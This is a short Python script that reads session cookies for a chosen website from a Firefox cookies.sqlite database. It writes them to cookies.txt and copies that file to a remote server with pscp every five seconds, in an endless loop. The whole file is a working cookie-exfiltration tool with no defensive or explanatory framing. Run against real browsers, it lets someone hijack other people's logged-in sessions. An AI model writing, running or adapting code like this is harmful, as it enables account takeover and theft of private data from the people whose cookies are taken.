import sqlite3
import os
import time

#Desired output filename
file_name = ('cookies.txt')

#Change USER and PROFILE to correct names
cookie_sql = ("cookies.sqlite")

def get_cookies(ff_cookies):
    con = sqlite3.connect(ff_cookies)
    cur = con.cursor()
    cur.execute("SELECT name, value FROM moz_cookies where host = '.target_website'")
    cookie_total = ""
    for item in cur.fetchall():
        cookie_total = cookie_total + " " + item[0] + "=" + item[1] + ";"
    return cookie_total
	
def save_cookies():
	cookie = get_cookies(cookie_sql)
	with open(file_name, "w") as new: new.write(cookie)
	os.system('pscp.exe -scp cookies.txt target_server')

while True:
	save_cookies()
	time.sleep(5)